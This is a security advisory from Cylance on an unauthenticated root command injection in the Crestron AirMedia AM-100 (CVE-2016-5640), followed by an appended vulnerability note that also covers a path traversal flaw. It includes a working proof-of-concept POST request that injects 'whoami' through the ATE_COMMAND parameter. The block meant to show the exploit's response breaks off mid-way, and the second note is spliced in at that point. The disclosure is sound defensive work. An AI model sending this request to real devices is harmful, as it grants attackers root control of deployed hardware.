# [CLVA-2016-05-002]: Crestron AM-100 Command Injection Vulnerability

# Summary

Cylance identified a vulnerability in the Crestron AirMedia AM-100, which could allow an unauthenticated entity to execute arbitrary commands on affected devices. The unauthenticated user must be able to access the web server on the affected devices.

## Product Description

The Crestron AirMedia AM-100 allows users to "wirelessly present PowerPoint®, Excel®, Word, and PDF documents, as well as photos, on the room display from their personal iOS® or Android™ mobile device" or desktop/laptop. (via <http://www.crestron.com/microsites/airmedia-mobile-wireless-hd-presentations>).

## Affected Products

* Crestron AirMedia AM-100 (firmware v1.1.1.11 - v1.2.1)

## Impact

An unauthenticated entity may be able to execute arbitrary commands on the affected AM-100 as superuser ("root").

# Vulnerability Information

* Cylance Identifier: CLVA-2016-05-002
* CVE Identifier: CVE-2016-5640

## Description

A command injection vulnerability exists in `rftest.cgi` on the AM-100 embedded web server. The `ATE_COMMAND` POST parameter specifies the path to a command for the underlying OS to execute. By default, the value of this parameter is `/sbin/iwpriv`; however, the value of this parameter can be a relative or absolute path to any arbitrary command on the underlying OS.

## Impact

Attackers may execute unauthorized commands, which could then be used to disable the software, or read and modify data for which the attacker does not have permissions to access directly. Additionally, as the embedded web server runs as root, subsequent commands/processes will also run as root, providing unfettered access to the system.

## Attack Scenario

An unauthenticated entity with access to the AM-100 embedded web server could send HTTP POST data to `rftest.cgi`, specifying any arbitrary command to be executed.

## Resolution

Crestron has released firmware version 1.4.0.13 to address this issue. Affected users should update the firmware of their AM-100 as soon as possible. Crestron partners can find the latest firmware at <http://www.crestron.com/products/model/AM-100>

## Additional Information

### Details for CLVA-2016-05-002

* Example of a benign/normal `POST` request body for `rftest.cgi`:

```
POST https://[AM-100-ADDRESS]/cgi-bin/rftest.cgi?lang=en&src=AwServicesSetup.html&[TOKEN] HTTP/1.1
...
ATE_COMMAND=%2Fsbin%2Fiwpriv+ra0+set+ATE%3DATESTART%3B%2Fsbin%2Fiwpriv+ra0+set+ATETXLEN%3D24%3B%2Fsbin%2Fiwpriv+ra0+set+ATE%3DTXCONT%3B&ATECHANNEL=&ATETXLEN=24&ATETXCNT=&ATETXMODE=&ATETXBW=&ATETXGI=&ATETXMCS=&ATETXANT=&ATERXANT=&ATERXFER=&ResetCounter=&ATEAUTOALC=&ATEIPG=&ATEPAYLOAD=&ATE=TXCONT

```

* Example of expected response:

```
HTTP/1.1 200 OK
Content-Type: text/html
Date: Wed, 26 Oct 2005 19:07:53 GMT
Server: lighttpd/1.4.35-devel-4f1e285

<meta http-equiv="content-Type" content="text/html; charset=utf-8">

```

* Example of malicious `POST` request body for `rftest.cgi`, specifying the `whoami` command for the `ATE_COMMAND` parameter:

```
ATE_COMMAND=whoami&ATECHANNEL=&ATETXLEN=24&ATETXCNT=&ATETXMODE=&ATETXBW=&ATETXGI=&ATETXMCS=&ATETXANT=&ATERXANT=&ATERXFER=&ResetCounter=&ATEAUTOALC=&ATEIPG=&ATEPAYLOAD=&ATE=TXCONT

```

* Response (note response contains `root`, indicating successful execution of `whoami`, as well as identifying that the web server runs as superuser):

```
HTTP/1.1 200 OK
Date: Wed, 26 Oct 2005 20:50:35 GMT
Server: lighttpd/1.4.35-devel-4f1e285

### Overview

The Crestron AirMedia AM-100 with firmware prior to version 1.4.0.13 is vulnerable to path traversal and command injection.

### Description

| [**CWE-22**](http://cwe.mitre.org/data/definitions/22.html)**: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') -** CVE-2016-5639  A path traversal vulnerability exists in login.cgi (and possibly other binaries in the /home/boa/cgi-bin directory) on the AM-100 embedded web server. The src GET parameter passed to login.cgi specifies the relative path to a file for rendering, such as AwLoginDownload.html. However, the value of this parameter can specify an arbitrary path on the AM-100 filesystem.[**CWE-77**](http://cwe.mitre.org/data/definitions/77.html)**: Improper Neutralization of Special Elements used in a Command ('Command Injection') -** CVE-2016-5640A command injection vulnerability exists in rftest.cgi on the AM-100 embedded web server. The ATE\_COMMAND POST parameter specifies the path to a command for the underlying OS to execute. By default, the value of this parameter is /sbin/iwpriv; however, the value of this parameter can be a relative or absolute path to any arbitrary command on the underlying OS. Crestron AirMedia AM-100 firmware v1.1.1.11 - v1.2.1 are confirmed affected by the researcher. For more information see the researcher's [advisory one](https://github.com/CylanceVulnResearch/disclosures/blob/master/CLVA-2016-05-001.md) and [advisory two](https://github.com/CylanceVulnResearch/disclosures/blob/master/CLVA-2016-05-002.md). |
| --- |

### Impact

| An unauthenticated remote user may be able to access arbitrary files from the device filesystem, or execute arbitrary OS commands on the device. |
| --- |

### Solution

| **Apply an update**Crestron has released [firmware version 1.4.0.13](http://www.crestron.com/products/model/AM-100) to address these issues. Affected users should update the firmware of their AM-100 as soon as possible. |
